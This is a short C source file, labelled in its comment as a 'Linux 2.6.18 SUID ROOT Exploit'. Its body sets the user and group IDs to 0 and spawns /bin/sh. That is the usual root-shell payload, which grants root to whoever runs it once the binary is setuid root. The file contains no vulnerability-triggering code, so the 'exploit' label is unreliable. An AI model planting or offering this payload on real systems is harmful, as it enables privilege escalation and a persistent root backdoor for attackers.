// Linux 2.6.18 SUID ROOT Exploit
int main(void) {
       setgid(0); setuid(0);
       execl("/bin/sh","sh",0); }
